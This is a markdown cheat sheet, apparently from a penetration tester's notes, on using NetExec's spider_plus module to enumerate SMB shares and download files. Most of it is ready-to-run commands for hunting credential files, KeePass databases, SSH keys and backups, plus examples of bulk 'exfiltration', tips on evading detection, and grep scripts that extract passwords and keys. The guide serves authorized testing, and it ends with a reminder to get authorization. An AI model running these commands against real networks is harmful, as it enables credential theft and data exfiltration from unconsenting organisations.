---
title: "NetExec - SpiderPlus"
description: "NetExec has two main spider modules:"
category: tools
tags: ["tools"]
tools: ["NetExec", "PowerShell"]
difficulty: intermediate
updated: "2026-08-10"
source: "vault:Tools/NetExec - SpiderPlus.md"
---
# NetExec Spider Module Guide - Downloading Files from SMB Shares

## Spider Modules Overview

NetExec has two main spider modules:
- **spider_plus** - Modern, feature-rich (recommended)
- **spider** - Legacy module (deprecated)

---

## Spider Plus Module Deep Dive

### 1. Basic Spider Usage (List Files Only)

```bash
# Spider all shares (read-only mode - no downloads)
nxc smb 10.10.11.51 -u 'username' -p 'password' -M spider_plus

# Spider with null/guest session
nxc smb 10.10.11.51 -u '' -p '' -M spider_plus
nxc smb 10.10.11.51 -u 'guest' -p '' -M spider_plus

# Spider specific share
nxc smb 10.10.11.51 -u 'username' -p 'password' -M spider_plus -o SHARE=ShareName
```

**Output Location:** Results saved to `/tmp/nxc_spider_plus/<IP>_<timestamp>.json`

---

## 2. Downloading Files

### Download All Files
```bash
# Enable download mode (downloads everything!)
nxc smb 10.10.11.51 -u 'username' -p 'password' -M spider_plus -o READ_ONLY=false

# Downloads saved to: /tmp/nxc_spider_plus/<IP>/
```

⚠️ **Warning:** This downloads ALL accessible files. Use filters to limit!

---

## 3. Filtering Options

### Filter by File Extension

```bash
# Download only specific file types
nxc smb 10.10.11.51 -u 'username' -p 'password' -M spider_plus -o READ_ONLY=false EXT=txt,doc,docx,pdf

# Common useful extensions
nxc smb 10.10.11.51 -u 'username' -p 'password' -M spider_plus -o READ_ONLY=false EXT=txt,pdf,docx,xlsx,xml,config,conf,ini,ps1,bat,cmd

# Password files and sensitive data
nxc smb 10.10.11.51 -u 'username' -p 'password' -M spider_plus -o READ_ONLY=false EXT=txt,xml,config,ini,kdbx,key,pem

# Scripts and code
nxc smb 10.10.11.51 -u 'username' -p 'password' -M spider_plus -o READ_ONLY=false EXT=ps1,bat,cmd,vbs,js,py,sh
```

### Filter by File Size

```bash
# Download files within size range (in bytes)
nxc smb 10.10.11.51 -u 'username' -p 'password' -M spider_plus -o READ_ONLY=false MAX_FILE_SIZE=52428800

# Small files only (under 10MB)
nxc smb 10.10.11.51 -u 'username' -p 'password' -M spider_plus -o READ_ONLY=false MAX_FILE_SIZE=10485760

# Exclude empty files
nxc smb 10.10.11.51 -u 'username' -p 'password' -M spider_plus -o READ_ONLY=false MIN_FILE_SIZE=1
```

**Size Reference:**
- 1 MB = 1,048,576 bytes
- 10 MB = 10,485,760 bytes
- 50 MB = 52,428,800 bytes
- 100 MB = 104,857,600 bytes

### Filter by Pattern (Filename Matching)

```bash
# Download files matching a pattern
nxc smb 10.10.11.51 -u 'username' -p 'password' -M spider_plus -o READ_ONLY=false PATTERN=password

# Multiple patterns (comma-separated)
nxc smb 10.10.11.51 -u 'username' -p 'password' -M spider_plus -o READ_ONLY=false PATTERN=password,admin,secret,credential,backup

# Case-insensitive pattern matching (default behavior)
nxc smb 10.10.11.51 -u 'username' -p 'password' -M spider_plus -o READ_ONLY=false PATTERN=pass
```

### Exclude Folders

```bash
# Exclude specific directories
nxc smb 10.10.11.51 -u 'username' -p 'password' -M spider_plus -o READ_ONLY=false EXCLUDE_DIR=Windows,Program Files

# Exclude common system folders
nxc smb 10.10.11.51 -u 'username' -p 'password' -M spider_plus -o EXCLUDE_DIR="Windows,Program Files,Program Files (x86),$Recycle.Bin"
```

---

## 4. Advanced Filtering Combinations

### Hunt for Passwords and Credentials

```bash
# Download credential-related files
nxc smb 10.10.11.51 -u 'username' -p 'password' -M spider_plus \
  -o READ_ONLY=false \
     PATTERN=password,pass,pwd,credential,cred,secret,admin,backup,config \
     EXT=txt,xml,config,ini,conf,kdbx,key,pem,ppk \
     MAX_FILE_SIZE=10485760

# Download KeePass databases
nxc smb 10.10.11.51 -u 'username' -p 'password' -M spider_plus \
  -o READ_ONLY=false \
     EXT=kdbx,kdb

# Download SSH keys
nxc smb 10.10.11.51 -u 'username' -p 'password' -M spider_plus \
  -o READ_ONLY=false \
     PATTERN=id_rsa,id_dsa,id_ecdsa,id_ed25519 \
     EXT=pem,key,ppk
```

### Hunt for Scripts and Configuration

```bash
# Download scripts and configs
nxc smb 10.10.11.51 -u 'username' -p 'password' -M spider_plus \
  -o READ_ONLY=false \
     EXT=ps1,bat,cmd,vbs,sh,py,config,conf,ini,xml,json \
     MAX_FILE_SIZE=5242880

# PowerShell scripts only
nxc smb 10.10.11.51 -u 'username' -p 'password' -M spider_plus \
  -o READ_ONLY=false \
     EXT=ps1,psm1,psd1
```

### Hunt for Documentation

```bash
# Download documents
nxc smb 10.10.11.51 -u 'username' -p 'password' -M spider_plus \
  -o READ_ONLY=false \
     EXT=doc,docx,pdf,txt,rtf,odt,xls,xlsx \
     MAX_FILE_SIZE=52428800

# Small text files only (README, notes, etc.)
nxc smb 10.10.11.51 -u 'username' -p 'password' -M spider_plus \
  -o READ_ONLY=false \
     EXT=txt,md \
     MAX_FILE_SIZE=1048576
```

### Hunt for Backup Files

```bash
# Download backup files
nxc smb 10.10.11.51 -u 'username' -p 'password' -M spider_plus \
  -o READ_ONLY=false \
     PATTERN=backup,bak,old,copy \
     EXT=bak,zip,7z,rar,tar,gz,old

# Archive files
nxc smb 10.10.11.51 -u 'username' -p 'password' -M spider_plus \
  -o READ_ONLY=false \
     EXT=zip,7z,rar,tar,gz,bz2 \
     MAX_FILE_SIZE=104857600
```

---

## 5. Complete Spider Workflow

### Phase 1: Reconnaissance (No Download)

```bash
# Step 1: Identify accessible shares
nxc smb 10.10.11.51 -u 'username' -p 'password' --shares

# Step 2: Spider to see what's available (read-only)
nxc smb 10.10.11.51 -u 'username' -p 'password' -M spider_plus

# Step 3: Review the JSON output
cat /tmp/nxc_spider_plus/10.10.11.51_*.json | jq '.'

# Step 4: Analyze file types and names
cat /tmp/nxc_spider_plus/10.10.11.51_*.json | jq '.[] | .name' | sort -u
```

### Phase 2: Targeted Download

```bash
# Based on reconnaissance, download specific files

# Example: Found interesting configs
nxc smb 10.10.11.51 -u 'username' -p 'password' -M spider_plus \
  -o READ_ONLY=false \
     SHARE=IT_Share \
     EXT=config,conf,xml,ini \
     MAX_FILE_SIZE=5242880

# Example: Found password files
nxc smb 10.10.11.51 -u 'username' -p 'password' -M spider_plus \
  -o READ_ONLY=false \
     PATTERN=password,credential \
     MAX_FILE_SIZE=1048576
```

### Phase 3: Post-Download Analysis

```bash
# Navigate to download location
cd /tmp/nxc_spider_plus/10.10.11.51/

# Find all downloaded files
find . -type f

# Search for passwords in files
grep -r -i "password" .
grep -r -i "pass" . | grep -v "Binary"

# Search for usernames
grep -r -i "username" .
grep -r -i "admin" .

# Search for IP addresses
grep -r -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" .

# Search for email addresses
grep -r -oE "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b" .

# List files by size
find . -type f -exec ls -lh {} \; | sort -k5 -h

# Find recently modified files
find . -type f -mtime -30 -ls
```

---

## 6. Spider Plus All Options Reference

```bash
nxc smb <target> -u <user> -p <pass> -M spider_plus -o <OPTIONS>
```

| Option | Description | Example |
|:---|:---|:---|
| `READ_ONLY` | If false, downloads files (default: true) | `READ_ONLY=false` |
| `SHARE` | Target specific share | `SHARE=C$` |
| `EXCLUDE_DIR` | Exclude directories (comma-separated) | `EXCLUDE_DIR=Windows,Temp` |
| `MAX_FILE_SIZE` | Max file size in bytes (default: 51200) | `MAX_FILE_SIZE=52428800` |
| `MIN_FILE_SIZE` | Min file size in bytes | `MIN_FILE_SIZE=1` |
| `EXT` | File extensions (comma-separated) | `EXT=txt,pdf,docx` |
| `PATTERN` | Filename pattern match | `PATTERN=password,admin` |
| `EXCLUDE_EXTS` | Exclude extensions | `EXCLUDE_EXTS=exe,dll,sys` |

---

## 7. Practical Examples

### Example 1: Initial Quick Recon

```bash
# First pass - just enumerate
nxc smb 10.10.11.51 -u 'jsmith' -p 'Summer2024!' -M spider_plus

# Check results
cat /tmp/nxc_spider_plus/10.10.11.51_*.json | jq '.[].name' | grep -i password
```

### Example 2: Download Interesting Files

```bash
# Download files with "password" or "config" in name
nxc smb 10.10.11.51 -u 'jsmith' -p 'Summer2024!' -M spider_plus \
  -o READ_ONLY=false \
     PATTERN=password,config,credential,backup \
     EXT=txt,xml,ini,config,conf \
     MAX_FILE_SIZE=10485760

# Check what was downloaded
ls -lah /tmp/nxc_spider_plus/10.10.11.51/
```

### Example 3: Specific Share Hunting

```bash
# Target the SYSVOL share (often contains scripts)
nxc smb 10.10.11.51 -u 'jsmith' -p 'Summer2024!' -M spider_plus \
  -o READ_ONLY=false \
     SHARE=SYSVOL \
     EXT=bat,cmd,ps1,vbs,xml

# Target NETLOGON share
nxc smb 10.10.11.51 -u 'jsmith' -p 'Summer2024!' -M spider_plus \
  -o READ_ONLY=false \
     SHARE=NETLOGON \
     EXT=bat,cmd,ps1,vbs
```

### Example 4: Large Scale Data Exfiltration

```bash
# Download all office documents (be careful with size!)
nxc smb 10.10.11.51 -u 'jsmith' -p 'Summer2024!' -M spider_plus \
  -o READ_ONLY=false \
     EXT=doc,docx,xls,xlsx,ppt,pptx,pdf \
     MAX_FILE_SIZE=52428800 \
     EXCLUDE_DIR="Windows,Program Files"

# Monitor download progress
watch -n 5 'du -sh /tmp/nxc_spider_plus/10.10.11.51/'
```

### Example 5: Multiple Hosts

```bash
# Spider multiple hosts (saves to separate folders)
nxc smb 10.10.11.0/24 -u 'jsmith' -p 'Summer2024!' -M spider_plus \
  -o READ_ONLY=false \
     PATTERN=password \
     EXT=txt,xml,config \
     MAX_FILE_SIZE=5242880

# Results organized by IP
ls -lah /tmp/nxc_spider_plus/
```

---

## 8. Pro Tips & Best Practices

### Performance Tips

```bash
# Use MAX_FILE_SIZE to avoid huge files
nxc smb 10.10.11.51 -u 'user' -p 'pass' -M spider_plus -o READ_ONLY=false MAX_FILE_SIZE=10485760

# Use EXCLUDE_DIR to skip system folders
nxc smb 10.10.11.51 -u 'user' -p 'pass' -M spider_plus -o EXCLUDE_DIR="Windows,Program Files,$Recycle.Bin"

# Target specific shares to reduce scope
nxc smb 10.10.11.51 -u 'user' -p 'pass' -M spider_plus -o SHARE=Users
```

### OPSEC Considerations

```bash
# Start with read-only enumeration
nxc smb 10.10.11.51 -u 'user' -p 'pass' -M spider_plus

# Download only specific, small files to reduce network traffic
nxc smb 10.10.11.51 -u 'user' -p 'pass' -M spider_plus \
  -o READ_ONLY=false \
     PATTERN=password \
     EXT=txt \
     MAX_FILE_SIZE=1048576

# Be aware: Downloads create access logs on the target
```

### Organizing Downloads

```bash
# Create organized workspace
mkdir -p ~/pentest/target/smb_loot
cd ~/pentest/target/smb_loot

# Run spider
nxc smb 10.10.11.51 -u 'user' -p 'pass' -M spider_plus -o READ_ONLY=false

# Move from /tmp to your workspace
mv /tmp/nxc_spider_plus/10.10.11.51 ./

# Organize by file type
cd 10.10.11.51
mkdir configs scripts documents
find . -name "*.config" -o -name "*.xml" -o -name "*.ini" | xargs -I {} mv {} configs/
find . -name "*.ps1" -o -name "*.bat" -o -name "*.cmd" | xargs -I {} mv {} scripts/
find . -name "*.doc*" -o -name "*.pdf" -o -name "*.txt" | xargs -I {} mv {} documents/
```

---

## 9. Post-Spider Analysis Scripts

### Quick Grep for Sensitive Data

```bash
#!/bin/bash
# save as analyze_spider.sh

TARGET_DIR="/tmp/nxc_spider_plus/10.10.11.51"

echo "[+] Searching for passwords..."
grep -r -i "password\s*=" $TARGET_DIR 2>/dev/null | grep -v "Binary"

echo "[+] Searching for usernames..."
grep -r -i "username\s*=" $TARGET_DIR 2>/dev/null | grep -v "Binary"

echo "[+] Searching for API keys..."
grep -r -i "api_key\|apikey\|api-key" $TARGET_DIR 2>/dev/null | grep -v "Binary"

echo "[+] Searching for connection strings..."
grep -r -i "connection.*string\|server=\|database=" $TARGET_DIR 2>/dev/null | grep -v "Binary"

echo "[+] Searching for private keys..."
find $TARGET_DIR -type f -exec grep -l "BEGIN.*PRIVATE KEY" {} \;

echo "[+] Files containing 'password':"
find $TARGET_DIR -type f -exec grep -l -i "password" {} \; | head -20
```

### Generate File Inventory

```bash
#!/bin/bash
# save as inventory.sh

TARGET_DIR="/tmp/nxc_spider_plus/10.10.11.51"

echo "[+] File type distribution:"
find $TARGET_DIR -type f | sed 's/.*\.//' | sort | uniq -c | sort -rn

echo -e "\n[+] Largest files:"
find $TARGET_DIR -type f -exec ls -lh {} \; | sort -k5 -hr | head -10

echo -e "\n[+] Recently modified files:"
find $TARGET_DIR -type f -mtime -30 -exec ls -lh {} \; | head -10

echo -e "\n[+] Files with interesting names:"
find $TARGET_DIR -type f | grep -iE "(password|config|admin|secret|credential|backup|key)"
```

---

## 10. Common Issues & Solutions

### Issue: Permission Denied
```bash
# Some files may not be readable
# Solution: Spider will skip them and continue

# Check spider_plus JSON for access denied files
cat /tmp/nxc_spider_plus/10.10.11.51_*.json | jq '.[] | select(.error != null)'
```

### Issue: Too Many Files
```bash
# If spider returns thousands of files:
# Solution: Use more specific filters

# Count files before downloading
cat /tmp/nxc_spider_plus/10.10.11.51_*.json | jq '. | length'

# Filter more aggressively
nxc smb 10.10.11.51 -u 'user' -p 'pass' -M spider_plus \
  -o READ_ONLY=false \
     EXT=txt,xml \
     PATTERN=password \
     MAX_FILE_SIZE=1048576
```

### Issue: Finding Downloaded Files
```bash
# Default location:
/tmp/nxc_spider_plus/<TARGET_IP>/

# Spider metadata (JSON):
/tmp/nxc_spider_plus/<TARGET_IP>_<timestamp>.json

# Find all spider directories
find /tmp/nxc_spider_plus/ -type d
```

---

## Quick Reference Card

| Task | Command |
|:---|:---|
| List files only | `nxc smb <ip> -u <user> -p <pass> -M spider_plus` |
| Download all files | `nxc smb <ip> -u <user> -p <pass> -M spider_plus -o READ_ONLY=false` |
| Download specific types | `nxc smb <ip> -u <user> -p <pass> -M spider_plus -o READ_ONLY=false EXT=txt,pdf` |
| Download by pattern | `nxc smb <ip> -u <user> -p <pass> -M spider_plus -o READ_ONLY=false PATTERN=password` |
| Limit file size | `nxc smb <ip> -u <user> -p <pass> -M spider_plus -o READ_ONLY=false MAX_FILE_SIZE=10485760` |
| Specific share | `nxc smb <ip> -u <user> -p <pass> -M spider_plus -o SHARE=Users` |
| Exclude folders | `nxc smb <ip> -u <user> -p <pass> -M spider_plus -o EXCLUDE_DIR=Windows,Temp` |
| View JSON output | `cat /tmp/nxc_spider_plus/<ip>_*.json \| jq '.'` |
| Find passwords in files | `grep -r -i "password" /tmp/nxc_spider_plus/<ip>/` |

---

## Real-World Hunting Scenarios

### Scenario 1: Found Valid Low-Priv Credentials

```bash
# Step 1: What can we access?
nxc smb 10.10.11.51 -u 'jsmith' -p 'pass' --shares

# Step 2: List everything (no download yet)
nxc smb 10.10.11.51 -u 'jsmith' -p 'pass' -M spider_plus

# Step 3: Hunt for creds in configs
nxc smb 10.10.11.51 -u 'jsmith' -p 'pass' -M spider_plus \
  -o READ_ONLY=false \
     PATTERN=password,credential,config \
     EXT=xml,config,ini,txt \
     MAX_FILE_SIZE=2097152

# Step 4: Analyze
cd /tmp/nxc_spider_plus/10.10.11.51
grep -r -i "password\|credential" .
```

### Scenario 2: Lateral Movement via Shares

```bash
# Download scripts to find hardcoded creds
nxc smb 10.10.11.0/24 -u 'jsmith' -p 'pass' -M spider_plus \
  -o READ_ONLY=false \
     EXT=ps1,bat,cmd,vbs \
     SHARE=SYSVOL

# Search scripts for credentials
find /tmp/nxc_spider_plus/ -name "*.ps1" -exec grep -H "password\|credential" {} \;
```

### Scenario 3: Backup File Discovery

```bash
# Find and download backups
nxc smb 10.10.11.51 -u 'backupuser' -p 'pass' -M spider_plus \
  -o READ_ONLY=false \
     PATTERN=backup,bak \
     EXT=zip,7z,bak,old,backup \
     MAX_FILE_SIZE=104857600

# Extract archives
cd /tmp/nxc_spider_plus/10.10.11.51
find . -name "*.zip" -exec unzip -d extracted {} \;
```

---

Remember: **Always have proper authorization before downloading files from systems you don't own!**
